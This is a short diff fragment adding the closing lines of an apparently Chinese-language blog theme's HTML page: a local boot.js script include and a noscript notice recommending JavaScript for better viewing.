+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
